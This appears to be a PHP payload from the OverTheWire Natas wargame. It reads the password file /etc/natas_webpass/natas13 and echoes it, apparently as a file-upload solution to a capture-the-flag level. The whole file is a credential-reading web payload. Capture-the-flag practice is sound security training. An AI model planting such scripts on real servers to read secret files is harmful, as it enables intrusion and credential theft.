<?php

    $file = "/etc/natas_webpass/natas13";

    $myfile = fopen($file, "r") or die("Unable to open file!");
    echo fread($myfile, filesize($file));
    fclose($myfile);
